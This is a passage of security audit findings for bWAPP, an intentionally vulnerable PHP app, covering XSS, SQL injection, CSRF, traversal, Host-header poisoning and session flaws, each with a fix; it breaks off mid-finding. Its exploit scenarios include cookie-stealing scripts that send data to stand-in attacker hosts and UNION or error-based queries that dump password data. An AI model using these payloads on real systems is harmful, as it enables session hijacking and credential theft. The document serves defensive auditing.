findings.description: At LOW security level, the CSRF protection (anti-token) is completely absent (lines 48-49 check). Additionally, the `login` field in the hidden input (line 124) is taken from `$_REQUEST["login"]` (line 45) rather than being locked to the session identity. This means a CSRF attack can not only change the victim's own secret, but can specify ANY login value, causing the UPDATE query (line 53) to modify an arbitrary user's secret: `UPDATE users SET secret = '...' WHERE login = '<attacker_chosen>'`.
findings.exploit_scenario: An attacker creates a hidden auto-submit form targeting csrf_3.php with login=admin and secret=pwned. Any authenticated victim visiting the attacker's page (while their security level is LOW) unwittingly changes the admin user's secret to a value chosen by the attacker, potentially enabling account takeover.
findings.recommendation: Always derive the target login from `$_SESSION["login"]` exclusively (as is done at MEDIUM/HIGH levels), never from user request parameters. Implement anti-CSRF tokens regardless of security level setting.

findings.title: Unvalidated directory parameter enables arbitrary filesystem directory listing
findings.description: At security level 0 (low/default), the `$_GET["directory"]` parameter is passed directly to `show_directory()` without any validation. Inside `show_directory()` (defined at line ~68), the value flows into `file_exists()` (line 72), `opendir()` (line 74), `readdir()` (line 76), and is embedded into HTML anchor `href` attributes (line 81). An attacker controls the full path, allowing traversal via `../` sequences to list contents of any directory on the filesystem.
findings.exploit_scenario: An attacker sends a GET request to `directory_traversal_2.php?directory=../../etc`. The `opendir("../../etc")` call succeeds, and the response includes links to every file in `/etc` (e.g., `passwd`, `shadow`, `ssh/sshd_config`). This leaks filesystem layout and file names, aiding further exploitation. Deeper traversal like `directory=../../../../` can enumerate the root filesystem.
findings.recommendation: Validate that the resolved canonical path of `$directory` starts with the intended base directory (e.g., `./documents`). Use `realpath()` and a prefix check, as is done in the security_level=2 branch with `directory_traversal_check_3()`. Apply this validation unconditionally, not only at higher security levels.

findings.title: Reflected XSS via user-controlled directory parameter in href attribute
findings.description:
The `show_directory()` function at line 81 constructs an HTML anchor tag by directly embedding the user-controlled `$directory` variable and filesystem-derived `$line` variable without HTML-encoding: ```php echo "" . $line . "
"; ``` At security level 0, `$directory` comes straight from `$_GET["directory"]`. An attacker can inject a double-quote to break out of the `href` attribute and inject arbitrary HTML/JavaScript event handlers (e.g., `onmouseover`). The `"` character is not sanitized.
findings.exploit_scenario: An attacker crafts a URL like: `directory_traversal_2.php?directory=documents" onmouseover="alert(document.cookie)` (URL-encoded). When the page renders, the anchor becomes: `...`. When a victim hovers over the link, the attacker's JavaScript executes in the victim's browser, stealing session cookies.
findings.recommendation: HTML-encode both `$directory` and `$line` using `htmlspecialchars()` before embedding them in HTML output. Additionally, validate `$directory` against an allowlist of permitted directory names.

findings.title: Reflected XSS and cache poisoning via unsanitized Host header injection
findings.description: The attacker-controlled HTTP Host header (`$_SERVER["HTTP_HOST"]`) is echoed directly into the HTML response without any encoding or validation when the security level cookie is not "1" or "2". This occurs at three distinct sinks: 1. Line ~37: `/bWAPP/stylesheets/stylesheet.css" />` 2. Line ~55: `` 3. Line ~121: `/bWAPP/portal.php">here` Because the value is injected inside HTML attribute values (href/src), an attacker can break out of the attribute context by including a double-quote character in the Host header and inject arbitrary HTML/JavaScript. For example: `Host: evil.com">
findings.exploit_scenario: An attacker sends an HTTP request with a crafted Host header such as `Host: attacker.com">
findings.recommendation: Never trust the Host header directly. Either: (1) validate it against an allowlist of known-good hostnames before use, or (2) use a server-side configured base URL instead of `$_SERVER["HTTP_HOST"]`. Additionally, always HTML-encode any user-influenced value before embedding it in output using `htmlspecialchars()`. At minimum, apply `htmlspecialchars($_SERVER["HTTP_HOST"], ENT_QUOTES, "UTF-8")` at each echo point.

findings.title: Host Header Injection enables password-reset poisoning
findings.description: When the application is at the LOW security level, the server-side value `$server` is populated directly from the attacker-controlled HTTP Host header (`$_SERVER["HTTP_HOST"]`) on line 77. This value is then embedded unsanitized into a password-reset email body on line 90: `"http://" . $server . "/bWAPP/secret_change.php?email=" . $email_enc . "&reset_code=" . $reset_code`. An attacker who can issue a request with a spoofed Host header controls the domain the victim sees in the reset link, while the valid `reset_code` (generated on lines 71-72) is included in that same link. The code on line 82 only checks `$_COOKIE["security_level"]` to decide whether to hardcode the server; at the default/low level it trusts the header wholesale.
findings.exploit_scenario: An attacker sends a POST request to `/bWAPP/hostheader_2.php` with `Host: evil.attacker.com` and `email=victim@example.com` in the body. The server generates a valid reset code, stores it in the database, and emails the victim a link like `http://evil.attacker.com/bWAPP/secret_change.php?email=victim%40example.com&reset_code=abc123...`. The victim clicks the link, which hits the attacker's server, leaking the reset_code. The attacker then visits the real `secret_change.php` with the captured code and changes the victim's secret, effectively hijacking the account.
findings.recommendation: Never trust the Host header for constructing URLs in security-sensitive flows. Replace the dynamic `$server = $_SERVER["HTTP_HOST"]` with a server-side configured trusted hostname (as is already done for MEDIUM/HIGH security levels). Validate or whitelist the Host header if dynamic behavior is required.

findings.title: Stored XSS via unsanitized session login username rendered in HTML
findings.description: The value stored in `$_SESSION["login"]` is echoed directly into the HTML response on line 74 without HTML-encoding: `echo ucwords($_SESSION["login"])`. The `ucwords()` function does not sanitize HTML entities. If the application's user registration or authentication flow (e.g., `user_extra.php` for account creation or `login.php`) stores a user-chosen username in `$_SESSION["login"]` without sanitization, then any HTML/JavaScript in that username will execute in the browser of any page rendering this greeting. The username is attacker-controlled at account creation time, making this a stored XSS sink. The value persists across all page loads for the duration of the session.
findings.exploit_scenario: An attacker registers a new user account via `user_extra.php` with the username set to `<script>document.location='http://evil.example.com/steal?c='+document.cookie</script>`. Upon logging in, `$_SESSION["login"]` contains this payload. When the attacker (or any admin viewing a shared session context) visits `hpp-1.php` or any other page rendering this greeting, the script executes, exfiltrating session cookies to the attacker's server.
findings.recommendation: HTML-encode the session username before output: `echo htmlspecialchars(ucwords($_SESSION["login"]), ENT_QUOTES, 'UTF-8')`. Additionally, sanitize the username at the point of storage during registration/login to prevent malicious values from entering the session.

findings.title: Potential XSS via unsanitized bugs.txt entries in select option rendering
findings.description: On line 114, data loaded from the `bugs` array (populated from `bugs.txt` via `selections.php`) is split by comma and the first element `$bug[0]` is echoed directly into HTML without encoding: `echo "<option value='$key'>$bug[0]</option>";`. Similarly, `$key` is placed in a single-quoted attribute without encoding. If `bugs.txt` can be influenced by an attacker (e.g., through a separate file-write or inclusion vulnerability), the `$bug[0]` content could contain `</option><script>alert(1)</script>` to achieve XSS. Under normal conditions `bugs.txt` is a server-owned static file, so this is low confidence.
findings.exploit_scenario: If an attacker can write to or modify `bugs.txt` (via a separate file-upload or path-traversal vulnerability in another endpoint), they inject a line like `,somefile.php`. When any user visits `hpp-1.php`, the malicious entry renders and executes JavaScript in their browser context.
findings.recommendation: Apply `htmlspecialchars()` with `ENT_QUOTES` to both `$key` and `$bug[0]` before echoing them into the HTML: `echo "<option value='" . htmlspecialchars($key, ENT_QUOTES, 'UTF-8') . "'>" . htmlspecialchars($bug[0], ENT_QUOTES, 'UTF-8') . "</option>";`.

findings.title: Reflected XSS via unquoted href attribute with unsanitized user input at security level 0
findings.description:
The `name` GET parameter is reflected into an unquoted `href` attribute inside each vote link (line 148):
```
<a href=hpp-3.php?movie=...&name=<?php echo hpp($name);?>&action=vote>
```
At security level 0 (cookie `security_level=0`), the `hpp()` function (lines 34–37) calls `no_check()`, which returns `$data` unchanged. Because the href attribute value is NOT enclosed in quotes, an attacker can inject a space to break out of the URL and inject arbitrary HTML attributes/event handlers, or use `"` to break out entirely and inject new HTML elements. The same `$name` value is safely encoded in `$message` via `xss_check_3()`, but the vote link uses the separate `hpp()` function which provides no protection at level 0.
findings.exploit_scenario: An attacker crafts a URL: `hpp-2.php?name=test%20onmouseover=alert(document.cookie)`. When a victim visits this link, the rendered HTML becomes: `Vote` The browser parses `onmouseover=alert(document.cookie)` as a separate attribute on the `` tag. Hovering over the vote link triggers the injected JavaScript, stealing session cookies. Alternatively, `?name=test">` injects an inline script tag that fires automatically.
findings.recommendation: Always quote HTML attribute values and apply HTML-encoding (e.g., `htmlspecialchars()`) to user input reflected into attributes. Replace the raw echo in the href with `htmlspecialchars($name, ENT_QUOTES, 'UTF-8')`, or ensure the `hpp()` function at all security levels encodes data for the correct output context (HTML attribute context, not just URL-encoding).

findings.title: SQL injection via $_REQUEST["movie"] with insufficient sanitization
findings.description: The `movie` parameter is read from `$_REQUEST` (line 39), which aggregates GET, POST, and COOKIE sources, then interpolated into a SQL query on line 41 after passing through `sqli_check_2()`. In bWAPP, at low security levels `sqli_check_2` is typically a thin wrapper around `mysql_real_escape_string`, which does not protect against numeric injection or encoding-edge-case bypasses. The value is string-concatenated (`"'" . sqli_check_2($movie) . "'"`) into the query. An attacker controlling the `movie` parameter can inject SQL. Additionally, `$_REQUEST` allows the attacker to supply `movie` via POST body or COOKIE, bypassing any WAF or query-string-only inspection.
findings.exploit_scenario: An attacker sends a GET request to hpp-3.php with `name=x&movie=1' UNION SELECT 1,login,password,4,5,6,7 FROM users--&action=vote`. At low security level `sqli_check_2` does not use prepared statements, so the injected SQL executes, exfiltrating credentials. Alternatively, the attacker sends `movie` via a POST body or Cookie to evade query-string-based monitoring.
findings.recommendation: Use parameterized/prepared statements (PDO or mysqli) instead of string concatenation for all SQL queries. Read input from the expected superglobal only (e.g., `$_GET`) rather than `$_REQUEST`.

findings.title: Reflected XSS via unencoded database output in $message
findings.description: The movie title retrieved from the database (`$row["title"]`) is embedded directly into `$message` on line 56 without HTML encoding. This `$message` is later echoed raw via `<?php echo $message ?>` (line 142). If an attacker can cause a controlled string to be stored as a movie title (e.g., through another SQL injection or an admin feature), it becomes stored XSS. Even without stored XSS, a SQL injection (see F-03-01) can craft a UNION SELECT that returns attacker-controlled content as the "title" column, which is then rendered as HTML.
findings.exploit_scenario: An attacker exploits the SQL injection from F-03-01 with a UNION SELECT: `movie=1' UNION SELECT 1,'<script>alert(document.cookie)</script>',3,4,5,6,7--`. The injected string becomes `$row["title"]`, is placed into `$message`, and is rendered unescaped in the victim's browser, executing arbitrary JavaScript in their session context.
findings.recommendation: HTML-encode all dynamic content before output using `htmlspecialchars($row["title"], ENT_QUOTES, 'UTF-8')`. Apply output encoding consistently at the point of rendering, not at storage time.

findings.title: HPP check bypass: $_REQUEST pulls from POST/COOKIE, not just QUERY_STRING
findings.description: The application attempts to detect HTTP Parameter Pollution by inspecting `urldecode($_SERVER["QUERY_STRING"])` via `hpp_check_1()` (line 30). However, the actual `movie` value is read from `$_REQUEST["movie"]` (line 39), not from `$_GET["movie"]`. `$_REQUEST` merges GET, POST, and COOKIE data (with POST/COOKIE potentially overriding GET depending on php.ini `request_order`). An attacker can supply a clean QUERY_STRING (passing the HPP check) while supplying a malicious `movie` value via POST body or COOKIE, completely bypassing the HPP protection and injecting into the SQL query.
findings.exploit_scenario: An attacker sends a POST request to hpp-3.php with `name=x&movie=1' OR '1'='1&action=vote` in the POST body while keeping the query string clean (no duplicate params). The HPP check on QUERY_STRING passes, `$_REQUEST["movie"]` picks up the POST-injected value, and the SQL injection executes.
findings.recommendation: Read parameters from the specific expected superglobal (`$_GET`) rather than `$_REQUEST`. Move the HPP and input validation checks to operate on the same data source that the application logic consumes.

findings.title: Reflected XSS via unescaped $security_level variable
findings.description: The variable `$security_level` is echoed directly into HTML without encoding at line 76: ``. In bWAPP's architecture, this value is sourced from a user-controlled cookie via `security_level_check.php`. An attacker who can set or manipulate the security-level cookie can inject arbitrary HTML/JavaScript that will be rendered in the victim's browser when they visit this page. No `htmlspecialchars()` or other encoding is applied at the sink.
findings.exploit_scenario: An attacker crafts a URL or sets the victim's `security_level` cookie (e.g., via a subdomain or same-site weakness) to a value like `0</b><script>alert(document.cookie)</script>`. When the victim visits `lfi_sqlitemanager.php`, the injected script executes in their session context, stealing session cookies or performing actions as the victim.
findings.recommendation: Apply output encoding at the point of echo: `echo htmlspecialchars($security_level, ENT_QUOTES, 'UTF-8');`. Validate the security level against an allowlist of expected values (0, 1, 2) before rendering.

findings.title: Stored XSS via unescaped $bug[0] array element in option tag
findings.description: At line 94, data from the `$bugs` array (loaded from `bugs.txt` via `selections.php`) is exploded and `$bug[0]` is echoed raw into an HTML `<option>` tag: `echo "<option value='$key'>$bug[0]</option>";`. Neither `$bug[0]` nor `$key` is HTML-encoded. If an attacker can write to `bugs.txt` (e.g., through a separate file-write or file-upload vulnerability), they can inject persistent XSS payloads that execute for any admin or user viewing the bug-selection dropdown.
findings.exploit_scenario: An attacker exploits a separate vulnerability to append a line like `,<img src=x onerror=alert(1)>,filename.php` to `bugs.txt`. When any user visits `lfi_sqlitemanager.php`, the injected HTML renders and the JavaScript executes in the user's browser context.
findings.recommendation: Encode all dynamic output: `echo "<option value='" . htmlspecialchars($key, ENT_QUOTES, 'UTF-8') . "'>" . htmlspecialchars($bug[0], ENT_QUOTES, 'UTF-8') . "</option>";`.

findings.title: Stored XSS via unsanitized session login username in welcome message
findings.description: The value stored in `$_SESSION["login"]` is echoed directly into the HTML without any encoding or escaping on line 60: `echo ucwords($_SESSION["login"])`. If the user registration page (`user_extra.php`) permits usernames containing HTML/JavaScript, the malicious payload is stored in the session and rendered on every page visit, including this one. `ucwords()` only capitalizes words — it does not sanitize HTML. The output appears inside a `<font>` tag outside any JavaScript context, so a simple `<script>` tag injection suffices.
findings.exploit_scenario: An attacker creates an account with a username like `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` via the Create User page. Upon login, this username is stored in `$_SESSION["login"]`. Every subsequent page load renders the payload inside the "Welcome" banner, executing JavaScript in the victim's browser and exfiltrating session cookies.
findings.recommendation: HTML-encode the session login value before output: `echo htmlspecialchars(ucwords($_SESSION["login"]), ENT_QUOTES, "UTF-8")`. Additionally, validate and sanitize usernames at registration time to reject HTML special characters.

findings.title: Reflected XSS via unsanitized bug names from bugs.txt in option elements
findings.description: The `$bugs` array (loaded from `bugs.txt` via `selections.php`) is iterated and each entry is exploded and printed without HTML encoding on line 92: `echo "<option value='$key'>$bug[0]</option>"`. Both `$key` and `$bug[0]` are inserted into raw HTML. If `bugs.txt` can be influenced by an attacker (e.g., through a separate file-write or inclusion vulnerability elsewhere), or if the file is improperly managed, crafted bug names containing `<script>` tags or event handlers would execute in the browser. The `value` attribute is also unquoted with respect to single quotes since the echo uses single quotes around `$key` — a value containing `'>` would break out of the attribute.
findings.exploit_scenario: If an attacker can modify `bugs.txt` (e.g., via a separate path-traversal or file-write vulnerability in another component of the application), they inject a line like `"/><script>alert(document.cookie)</script>,sm_xst.php`. When the bug dropdown renders, the script executes in the context of the authenticated admin user.
findings.recommendation: HTML-encode both `$key` and `$bug[0]` before output: `echo "<option value='" . htmlspecialchars($key, ENT_QUOTES, "UTF-8") . "'>" . htmlspecialchars($bug[0], ENT_QUOTES, "UTF-8") . "</option>"`.

findings.title: Admin portal unlocked by GET parameter ?admin=1 at security_level 0 (and default)
findings.description: The authorization decision for the admin portal at security_level "0" (lines 20–38) and the default case (lines 89–110) is based entirely on the query-string parameter `$_GET["admin"]`. If the value equals `"1"`, the page is treated as unlocked. An unauthenticated user simply adds `?admin=1` to the URL to bypass the admin-gate entirely. The cookie `security_level` determines which code path runs; when it is `"0"` or absent/unrecognized, the GET-based check is used.
findings.exploit_scenario: An attacker who is not logged in visits `http://target/smgmt_admin_portal.php?admin=1` (optionally first setting the cookie `security_level=0`). The server returns the "unlocked" admin view, granting administrative content without any authentication.
findings.recommendation: Enforce authorization server-side via session state (as done in security_level 2). Never rely on client-controlled query-string or cookie values for privilege decisions.

findings.title: Admin portal unlocked by client-side cookie admin=1 at security_level 1
findings.description: At security_level "1" (lines 43–72), the authorization check reads `$_COOKIE["admin"]`. If the cookie equals `"1"`, the portal is unlocked. The cookie is initially set to `"0"` via `setcookie()` (line 65), but its value is fully client-controlled — an attacker can modify or inject it. No server-side session or database verification occurs.
findings.exploit_scenario: An attacker sets (or modifies) the cookie `admin=1` in their browser (e.g., via browser dev tools or `curl -b "admin=1;security_level=1"`). The server trusts the cookie value and returns the unlocked admin portal without any real authentication.
findings.recommendation: Use a server-side session attribute (as in security_level 2) to track admin status. Client-side cookies must never be trusted for authorization decisions without cryptographic integrity protection (e.g., signed JWT) — but server-side state is preferred.

findings.title: Reflected/stored XSS via unsanitized session login value echoed in navigation bar
findings.description: Line 127 renders the logged-in username directly into HTML without encoding: `echo ucwords($_SESSION["login"])`. If the value stored in `$_SESSION["login"]` was set from user-supplied input (the login form) without HTML-entity encoding, any JavaScript payload in the username will execute on every page load. The double `isset` check is redundant but does not sanitize. This is stored XSS across all pages that include this navigation block.
findings.exploit_scenario: An attacker registers or logs in with a username like `<script>alert(document.cookie)</script>`. If the login handler stores the raw username in `$_SESSION["login"]`, then every subsequent page — including this admin portal — renders the script in the browser of any user viewing that session, or in the attacker's own session for proof-of-concept.
findings.recommendation: Encode the output with `htmlspecialchars($_SESSION["login"], ENT_QUOTES, "UTF-8")` before echoing. Additionally, validate/sanitize the username at the point where it is written into the session during login.

findings.title: Admin cookie set without HttpOnly or Secure flags
findings.description: At line 65, `setcookie("admin", "0", time()+300, "/", "", false, false)` creates the authorization cookie without the `HttpOnly` flag (6th parameter = false) and without the `Secure` flag (7th parameter = false). Combined with Finding F-01-02, this means the cookie that gates admin access is accessible to JavaScript (enabling theft via any XSS on the domain) and will be sent over cleartext HTTP, enabling network-level credential interception.
findings.exploit_scenario: If any XSS exists on the same domain (e.g., via F-01-03), an attacker's script reads `document.cookie` to obtain the `admin=1` cookie, or an active network attacker on HTTP intercepts it. Combined with the cookie-based auth bypass (F-01-02), this further lowers the bar for privilege escalation.
findings.recommendation: Set `HttpOnly` and `Secure` flags on all sensitive cookies. More fundamentally, move the admin authorization decision to server-side session state so that the cookie value is irrelevant.

findings.title: Reflected XSS via unencoded cookie name and value output
findings.description: At lines 128-136, all cookies from `$_COOKIE` are iterated and their keys and values are echoed directly into the HTML response without any output encoding (no `htmlspecialchars()` or equivalent): ```php foreach ($_COOKIE as $key => $cookie) { ?> ``` `$_COOKIE` is derived from the `Cookie` HTTP request header, which is fully attacker-controlled. Any HTML/JavaScript injected into a cookie name or value will be rendered and executed in the victim's browser when they click the "Cookies" button (i.e., when `$_POST["form"]` is set, triggering the loop at line 127). The code path: user clicks "Cookies" → POST parameter `form=cookies` is set → `foreach ($_COOKIE ...)` iterates all cookies → raw `echo $key` / `echo $cookie` sinks without sanitization.
findings.exploit_scenario: An attacker who can plant a cookie in the victim's browser — via a separate XSS on any page of the same domain, via CRLF injection in any Set-Cookie header elsewhere, or via a compromised subdomain — sets a cookie such as `"><script>alert(document.cookie)</script>=1`. When the victim visits this page and clicks the "Cookies" button, the malicious cookie name is echoed unescaped into the HTML table, executing the attacker's JavaScript in the victim's session context. This allows session hijacking or further exploitation.
findings.recommendation: Apply `htmlspecialchars()` with `ENT_QUOTES` and an appropriate charset to both `$key` and `$cookie` before echoing: ```php ```

findings.title: Reflected XSS via cookie key and value echoed without HTML encoding
findings.description: The `$_COOKIE` superglobal is populated from the `Cookie` HTTP header, which is fully attacker-controlled. Inside the `foreach` loop (lines ~142-152), both `$key` and `$cookie` are echoed directly into the HTML response via `<?php echo $key;?>` and `<?php echo $cookie;?>` with no `htmlspecialchars()` or other output encoding. An attacker who can set any cookie on the victim's browser (via a prior XSS elsewhere, JavaScript on a subdomain, or network injection on a non-SSL page) can inject arbitrary HTML/JavaScript that executes when the victim clicks the "Cookies" button and the POST request renders the cookie table.
findings.exploit_scenario: An attacker sets a cookie named `top_security` (or any name) with value `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` on the victim's browser — for example, by injecting JavaScript on an HTTP (non-SSL) page of the same domain. When the victim visits this page and clicks "Cookies," the malicious script executes in the victim's session context, stealing session tokens or performing actions as the victim.
findings.recommendation: Apply `htmlspecialchars()` with `ENT_QUOTES` and an appropriate charset when echoing cookie data: `<?php echo htmlspecialchars($key, ENT_QUOTES, "UTF-8");?>` and `<?php echo htmlspecialchars($cookie, ENT_QUOTES, "UTF-8");?>`. This prevents the browser from interpreting cookie content as HTML/JavaScript.

findings.title: Security level read from client-controlled cookie without validation
findings.description: The application reads `$_COOKIE["security_level"]` directly at line 45 in a `switch` statement to determine the security configuration for cookie flags (Secure flag, HttpOnly flag, expiration). The value is not validated or compared against a server-side session store. Since cookies are client-controlled HTTP headers, any user can forge this value. Setting `security_level=0` causes the application to set the `top_security` cookie without the Secure flag (`false` for parameter 6 on line 54), weakening transport protection for that cookie.
findings.exploit_scenario: An attacker sends an HTTP request with `Cookie: security_level=0` to the application. The server processes this as security level "0" and sets the `top_security` cookie with `secure=false`, sending it over a potentially non-SSL channel. A network-level attacker can then intercept this cookie on the wire. Combined with the XSS in F-01-01, the attacker can first inject a cookie-setting payload, then downgrade the security level to remove the Secure flag.
findings.recommendation: Store the security level server-side (e.g., in `$_SESSION`) rather than trusting a client-side cookie. Validate any client-supplied security level against the authenticated session before using it to control security-sensitive behavior.

findings.title: Session ID exposed in URL enables session hijacking via Referer/header leakage
findings.description: At security_level 0 (lines 24-34) and the default case (lines 48-59), the application redirects the user to a URL containing the active PHP session ID as a query parameter: `header("Location: smgmt_sessionid_url.php?PHPSESSID=". $session_id)`. This causes the session token to appear in the browser address bar, browser history, proxy logs, web server access logs, and—critically—in the `Referer` header when the user follows any external link on the page (lines 130-134 contain multiple off-site links). Any party that can observe these channels can steal the session ID and hijack the user's authenticated session.
findings.exploit_scenario: A user at security_level 0 visits this page and is redirected to a URL containing ?PHPSESSID=abc123. The user then clicks the "Blog" link (line 130) navigating to itsecgames.blogspot.com. The Referer header sent to that external site includes the full URL with PHPSESSID=abc123. If the blog or any intermediate proxy logs Referers, the session ID is compromised and an attacker can replay it to hijack the session.
findings.recommendation: Never place session identifiers in URLs. Use cookies exclusively for session transport (session.use_only_cookies=1, session.use_trans_sid=0). Remove the URL-based session ID redirect entirely.

findings.title: Session fixation via attacker-supplied PHPSESSID URL parameter accepted without regeneration
findings.description: At security_level 0 (lines 24-34), when `$_GET["PHPSESSID"]` IS set, the code falls through to rendering the page without any session ID validation or regeneration. PHP will adopt the attacker-supplied session ID from the GET parameter as the active session. There is no call to `session_regenerate_id()` anywhere in this flow. An attacker can craft a link with a known PHPSESSID value, trick a victim into clicking it, and the victim's authenticated session will use that predetermined ID — enabling full session fixation.
findings.exploit_scenario: An attacker crafts URL: `smgmt_sessionid_url.php?PHPSESSID=attacker_fixed_1234` and sends it to a victim. The victim clicks the link; PHP initializes/resumes the session with ID "attacker_fixed_1234". The victim then logs in through the application. The attacker, who knows the session ID, can now use it on their own browser to access the victim's authenticated session.
findings.recommendation: Always regenerate the session ID after any privilege-level change (especially login) using `session_regenerate_id(true)`. Do not accept session identifiers from GET parameters. Set `session.use_only_cookies = 1` in php.ini.

findings.title: SQL injection via unsanitized GET title parameter in search query
findings.description:
The user-supplied `$_GET["title"]` value (line ~131: `$title = $_GET["title"];`) is passed through the `sqli()` function which dispatches on `$_COOKIE["security_level"]`. When the cookie is "0" (the default/fallback case, lines 19 and 33), `no_check()` is called and the data is returned unchanged. The return value is then directly concatenated into a SQL query on line 135:

`$sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'";`

This query is executed via `mysql_query()` on line 137. An attacker who controls the `security_level` cookie (or simply leaves it unset/default) can inject arbitrary SQL. Additionally, the raw `mysql_error()` output is returned to the user on line 143, facilitating error-based data exfiltration.
findings.exploit_scenario: An attacker sends a GET request to sqli_1.php with the title parameter set to `' UNION SELECT 1,2,3,4,5--` (or any standard SQLi payload) and either no security_level cookie or one set to "0". The application executes the injected query against the MySQL database, allowing the attacker to extract sensitive data from any table (e.g., credentials from the users table), potentially achieving full database compromise.
findings.recommendation: Use parameterized/prepared statements instead of string concatenation to build SQL queries. Replace the `mysql_query()` call with PDO or mysqli prepared statements. For example: `$stmt = $pdo->prepare("SELECT * FROM movies WHERE title LIKE :title"); $stmt->execute(['title' => '%' . $title . '%']);`

findings.title: Error-based SQL injection aided by verbose MySQL error output
findings.description: On line 143, when `mysql_query()` fails, the full MySQL error string is rendered directly into the HTML response via `die("Error: " . mysql_error())`. An attacker injecting malformed SQL can leverage the detailed database error messages to perform error-based SQL injection, extracting database contents (table names, column values) through crafted payloads that trigger errors containing the desired data (e.g., using `EXTRACTVALUE()` or `UPDATEXML()` techniques).
findings.exploit_scenario: An attacker sends a request with `title=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--`. The MySQL error message will contain the extracted password hash, which is then displayed in the page output via `mysql_error()`.
findings.recommendation: Never expose raw database error messages to the client. Replace `die("Error: " . mysql_error())` with a generic error message and log the detailed error server-side only.

findings.title: Reflected XSS via unsanitized database output echoed in HTML
findings.description: Query results are echoed directly into HTML without HTML-encoding on lines 159-163: `echo $row["title"]`, `echo $row["release_year"]`, `echo $row["main_character"]`, `echo $row["genre"]`. If an attacker can inject or store HTML/JavaScript content in the movies table (e.g., via the SQL injection in F-01-01 with an INSERT/UPDATE, or if an admin feature allows movie creation), the payload will execute in the browser of any user viewing the search results. Additionally, since the search term is itself SQL-injected and the error output includes `mysql_error()`, reflected content could reach the page context.
findings.exploit_scenario: An attacker uses the SQL injection vulnerability to insert a row into the movies table with a title value of `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. When any user subsequently searches for movies, the script executes in their browser session, stealing their session cookie.
findings.recommendation: HTML-encode all dynamic output before embedding it in the page. Use `htmlspecialchars($row["title"], ENT_QUOTES, 'UTF-8')` for each field echoed in the HTML table.

findings.title: SQL injection via unsanitized GET parameter "title" at security level 0
findings.description: Untrusted input enters at line 57 via `$_GET["title"]`. It is passed through the `sqli()` wrapper (line 61), which at security_level cookie value "0" (the default) delegates to `no_check()`, returning the raw value unchanged. The unsanitized value is concatenated directly into a SQL LIKE clause: `"SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'"`. This constructed string is then executed by `mysql_query()` on line 64. Because the attacker fully controls the `title` parameter with no sanitization, they can break out of the LIKE string literal and inject arbitrary SQL.
findings.exploit_scenario: An attacker sends a GET request to `sqli_10-2.php?title=' UNION SELECT 1,username,password,4,5,6,7 FROM users -- `. The single quote closes the LIKE string literal, the UNION clause appends a second result set dumping all usernames and passwords from the users table, and `--` comments out the trailing `%'`. The JSON response will contain the exfiltrated credentials. No authentication or special cookie (other than the default security_level=0) is required.
findings.recommendation: Use parameterized/prepared statements instead of string concatenation. For example, with PDO: `$stmt = $pdo->prepare("SELECT * FROM movies WHERE title LIKE ?"); $stmt->execute(["%" . $title . "%"]);`. Additionally, remove or restrict the `no_check` code path.

findings.title: SQL Injection via unsanitized GET parameter "title" in SQLite query
findings.description: Untrusted user input enters via `$_GET["title"]` (line ~128). It is passed to the `sqli()` function (line 131), which at security_level 0 (cookie value "0" or default) calls `no_check()` — returning the raw value unchanged.
